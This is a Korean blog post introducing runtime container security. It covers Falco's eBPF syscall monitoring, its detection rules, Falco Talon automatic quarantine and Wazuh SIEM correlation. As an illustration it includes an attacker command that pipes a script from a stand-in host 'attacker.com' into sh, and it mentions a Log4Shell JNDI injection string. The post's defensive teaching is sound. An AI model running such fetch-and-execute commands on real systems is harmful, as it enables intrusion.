---
title: "[Falco/Wazuh 시리즈 #1] 런타임 보안이란 무엇인가 — 컨테이너 내부에서 일어나는 일을 어떻게 감시하는가"
date: 2026-03-03T11:00:00+09:00
description: "빌드 타임 보안(Trivy)만으로 부족한 이유, 런타임 보안이 왜 필요한지, Falco가 syscall로 어떻게 이상 행위를 탐지하는지 개념부터 이해한다"
tags: ["falco", "runtime-security", "ebpf", "kubernetes", "security", "ids", "syscall"]
categories: ["study", "Security"]
series: ["Falco/Wazuh 시리즈"]
draft: false
---

## 이 글을 읽기 전에

Falco/Wazuh 시리즈의 다른 글들은 이미 구축을 전제로 시작한다:

- Falco eBPF 런타임 보안 아키텍처 (IDS + IPS)
- Falco 런타임 보안 트러블슈팅
- Falco + Wazuh 공격 탐지 파이프라인

그런데 처음 보는 사람은 이런 질문을 하게 된다:

> **"이미지 스캔(Trivy)으로 취약점 잡으면 충분하지 않나? 왜 런타임 보안이 따로 필요한가?"**

이 글은 그 질문에 답한다.

---

## 1. 보안은 시점별로 나뉜다

### 공격이 일어나는 타임라인

보안 위협은 한 시점에만 나타나지 않는다:

```
코드 작성    빌드    이미지 저장    배포    실행 중
   │          │         │          │        │
   │          │         │          │        │
   ▼          ▼         ▼          ▼        ▼
[비밀키    [취약한    [변조된    [잘못된   [실행 중
 커밋]     라이브러리]  이미지]   권한설정]  RCE 공격]
   │          │         │          │        │
[GitLeaks] [Trivy]  [서명검증]  [Kyverno] [Falco]
```

각 도구가 다른 시점의 위협을 담당한다. **런타임 보안은 가장 마지막, 실제 실행 중인 컨테이너를 감시한다.**

### Trivy만으로 부족한 이유

**Trivy가 하는 일**: 이미지에 포함된 패키지의 CVE(알려진 취약점) 목록을 검사한다.

```
Trivy 스캔 결과:
  ✅ CVE-2024-12345: libssl 3.0.x → 취약, 업그레이드 필요
  ✅ CVE-2023-98765: glibc 2.35 → 취약, 패치 필요
```

**Trivy가 못 하는 것:**

| 상황 | 이유 |
|------|------|
| **Zero-day 공격** | CVE 등록 전이라 DB에 없음 |
| **정상 도구 악용** | bash, curl은 취약점 없음, 하지만 공격자도 사용 |
| **런타임 동작 추적** | 이미지 스캔은 파일 분석, 실행 중 행위는 모름 |
| **공급망 공격** | 빌드 후 이미지 변조 → Trivy는 빌드 시점에만 스캔 |

**예시: Log4Shell (CVE-2021-44228)**

```
공격자가 HTTP 요청에 ${jndi:ldap://...} 삽입
  │
  ▼
Log4j가 이 문자열을 해석 (정상 동작처럼 보임)
  │
  ▼
Log4j가 원격 서버에서 Java 클래스 다운로드 실행
  │
  ▼
공격자 서버에서 악성 코드 실행

Trivy: "Log4j 버전이 취약합니다" → 알 수 있음
         BUT: "지금 이 Java 프로세스가 외부 주소로 코드를 내려받고 있다" → 모름
Falco: "Java 프로세스가 curl/wget 실행!" → 즉시 탐지
```

---

## 2. 런타임 보안의 원리: syscall 감시

### 모든 프로그램은 syscall을 사용한다

어떤 프로그램이든 파일을 읽고, 네트워크를 사용하고, 프로세스를 실행하려면 **Linux 커널에 요청(syscall)을 보내야 한다**.

```
공격자가 쉘을 획득 후 실행하는 명령:
  bash -c "curl http://attacker.com/malware | sh"

이때 발생하는 syscall:
  execve("/bin/bash")          ← 쉘 실행
  execve("/usr/bin/curl")      ← curl 실행
  socket(AF_INET, SOCK_STREAM) ← 네트워크 소켓 생성
  connect(attacker.com:80)     ← 외부 연결
  execve("/bin/sh")            ← 악성 스크립트 실행
```

**핵심**: 공격자가 아무리 교묘한 코드를 짜도, 실제로 무언가를 하려면 반드시 syscall을 호출해야 한다. syscall을 감시하면 공격자의 행위를 탐지할 수 있다.

### Falco가 syscall을 감시하는 방법: eBPF

```
┌──────────────────────────────────────────────────┐
│                 User Space                       │
│                                                  │
│  Pod 내 컨테이너 (nginx, Spring Boot, ...)        │
│       │ execve, open, connect, ...               │
│  System Call 요청                                 │
└──────────────────────┬───────────────────────────┘
                       │
              System Call 경계
                       │
┌──────────────────────▼───────────────────────────┐
│                 Kernel Space                     │
│                                                  │
│  ┌─────────────────────────────────────────┐     │
│  │         eBPF Hook (kprobe/tracepoint)   │     │
│  │                                         │     │
│  │  syscall 발생 → Falco eBPF 프로그램 실행 │     │
│  │  → 이벤트를 User Space Falco에 전달      │     │
│  └─────────────────────────────────────────┘     │
│                                                  │
│  Linux Kernel (TCP/IP, VFS, Process ...)         │
└──────────────────────────────────────────────────┘
```

Falco는 eBPF hook을 통해 모든 syscall을 감시한다. **컨테이너 내부를 수정하거나 sidecar를 주입할 필요 없다** — 노드 커널 레벨에서 전체를 감시한다.

---

## 3. Falco의 탐지 규칙: "이 행동은 이상하다"

### 규칙 기반 탐지

Falco는 **"정상적인 컨테이너에서 일어날 수 없는 행동"**을 규칙으로 정의한다:

```yaml
# 규칙 예시 1: 컨테이너에서 쉘 실행
- rule: Terminal shell in container
  desc: 컨테이너 내부에서 대화형 쉘이 열렸다
  condition: >
    spawned_process and
    container and
    proc.name in (shell_binaries)   # bash, sh, zsh 등
  output: >
    쉘 실행 탐지! (user=%user.name container=%container.name proc=%proc.cmdline)
  priority: WARNING

# 규칙 예시 2: 패키지 관리자 실행 (컨테이너에서 apt install은 이상함)
- rule: Package management launched in container
  desc: 컨테이너 내부에서 apt, yum 등 실행
  condition: >
    spawned_process and
    container and
    proc.name in (package_mgmt_binaries)   # apt, yum, pip 등
  priority: ERROR

# 규칙 예시 3: Java 프로세스가 네트워크 외부 연결 시작
- rule: Outbound Connection from Java Process
  condition: >
    outbound and
    proc.name = "java" and
    not fd.sip in (known_java_ips)
  priority: WARNING
```

### 탐지 후 무엇이 일어나는가

```
공격자: 컨테이너에서 bash 실행
         │
         ▼
Falco eBPF: execve("/bin/bash") syscall 감지
         │
         ▼
Falco 규칙 매칭: "Terminal shell in container" → WARNING
         │
         ▼
Falcosidekick (이벤트 라우팅)
  ├─→ Loki (로그 보관) → Grafana 대시보드에 표시
  ├─→ Discord 웹훅 → 즉시 알림
  └─→ Falco Talon (IPS)
         │
         ▼
Talon 자동 대응 (CRITICAL이면):
  kubectl label pod <attacked-pod> quarantine=true
  → NetworkPolicy로 해당 Pod 모든 트래픽 차단 (격리)
```

---

## 4. IDS vs IPS: 탐지만 하는가, 차단까지 하는가

### 두 개념의 차이

| 구분 | 역할 | 비유 | 도구 |
|------|------|------|------|
| **IDS** (Intrusion Detection System) | 탐지 + 알림 | CCTV | Falco |
| **IPS** (Intrusion Prevention System) | 탐지 + 자동 차단 | 경비원 | Falco Talon |

**IDS만 있으면:**
```
공격 탐지 → 알림 → 사람이 확인 → 대응 결정 → 조치
             ↑ 이 사이에 10-30분이 걸릴 수 있다
```

**IPS 추가 시:**
```
공격 탐지 → 즉시 자동 격리 → 사람이 확인 → 사후 분석
             ↑ 수 초 이내
```

### 홈랩 구성: 3계층 방어

```
공격 발생
  │
  ▼
Falco (IDS)
  탐지: "Java 프로세스가 bash 실행 (RCE 징후)"
  │
  ▼
Falcosidekick
  │
  ├─→ Loki → Grafana (대시보드 알림)
  ├─→ Discord (즉시 알림)
  └─→ Falco Talon (IPS)
              │
              ├─ WARNING: suspicious 라벨 부여 (분석 대기)
              └─ CRITICAL: quarantine 라벨 → NetworkPolicy로 격리
  │
  ▼
Wazuh (SIEM)
  여러 소스 통합 분석:
  - Falco 이벤트
  - 시스템 로그 (auth.log, syslog)
  - 파일 무결성 모니터링
  → 상관 분석: "이 IP에서 SSH 실패 10회 + 컨테이너 쉘 실행" = 공격 연계
```

---

## 5. SIEM이란 무엇인가: Wazuh의 역할

### 각 도구가 보는 것

| 도구 | 보는 것 | 한계 |
|------|---------|------|
| Falco | 컨테이너 syscall | 시스템 로그 모름 |
| Linux syslog | OS 레벨 이벤트 | 컨테이너 내부 모름 |
| auth.log | SSH 로그인 시도 | 다른 이벤트와 연관 못 지음 |

이벤트가 각자 분리돼 있으면 **공격의 전체 그림**을 보기 어렵다.

### SIEM: 통합해서 상관 분석

**SIEM (Security Information and Event Management)**은 여러 보안 이벤트를 한 곳에 모아 분석한다.

```
Wazuh가 하는 일:

입력:
  Falco 이벤트 ─────┐
  syslog ───────────┤
  auth.log ─────────┼─→ Wazuh Manager ─→ 분석 엔진
  파일 변경 감지 ────┤                      │
  취약점 스캔 ───────┘                      │
                                           ▼
                                    상관 분석 규칙:
                                    "SSH 실패 10회 AND
                                     5분 내 컨테이너 쉘 실행
                                     → 공격 연계 HIGH ALERT"
                                           │
                                           ▼
                                    Wazuh Dashboard
                                    (통합 시각화)
```

---

## 6. 왜 이것이 포트폴리오에 중요한가

### "보안 엔지니어" 관점에서

보안 엔지니어 직무에서 자주 묻는 것:

- "런타임 보안은 어떻게 구현하셨나요?" → **Falco eBPF + syscall 감시**
- "IDS와 IPS의 차이를 실제로 구현해보셨나요?" → **Falco + Talon**
- "SIEM을 써보셨나요?" → **Wazuh 구축 및 운영**
- "공격 탐지를 직접 검증해보셨나요?" → **자기 서비스에 공격 → Falco 알림 확인**

이 경험이 강력한 이유: **"구축했다"가 아니라 "공격 → 탐지 → 대응까지 전체 사이클을 직접 경험했다"**

---

## 7. 다음에 다룰 것

이 글은 런타임 보안의 **개념과 왜 필요한가**를 다뤘다.

시리즈 다음 글들에서는 실제 구축과 운영을 다룬다:

| 글 | 내용 |
|----|------|
| **[#2] Falco eBPF 런타임 보안 아키텍처** | IDS + IPS 실제 구성, Falcosidekick, Talon |
| **[#3] Falco 런타임 보안 트러블슈팅** | 오탐 처리, 규칙 커스터마이징 |
| **[#4] Falco + Wazuh Helm Wrapper Chart** | GitOps로 관리하는 보안 스택 |
| **[#5] Falco Talon 자동 격리 정책** | 공격 시 자동 NetworkPolicy 적용 |
| **[#6] Falco + Wazuh 공격 탐지 파이프라인** | 실제 공격 → 탐지 → 알림 전체 흐름 |

---

## 정리

- **런타임 보안이 필요한 이유**: Trivy(빌드 타임)는 Zero-day, 정상 도구 악용, 실행 중 행위를 탐지할 수 없다
- **syscall 감시**: 모든 프로그램이 반드시 syscall을 사용한다 → syscall을 감시하면 공격 행위를 탐지 가능
- **Falco**: eBPF hook으로 컨테이너 내부 수정 없이 전체 노드의 syscall 감시
- **IDS vs IPS**: Falco는 탐지(IDS), Talon은 자동 차단(IPS)
- **SIEM (Wazuh)**: 여러 보안 이벤트를 통합해 상관 분석 → 공격 전체 그림 파악

---

**작성일**: 2026-03-03
**태그**: falco, runtime-security, ebpf, kubernetes, security, ids, syscall
**다음 글**: [[Falco/Wazuh 시리즈 #2] Falco eBPF 런타임 보안 아키텍처](/study/2026-01-25-falco-ebpf-runtime-security-architecture/)
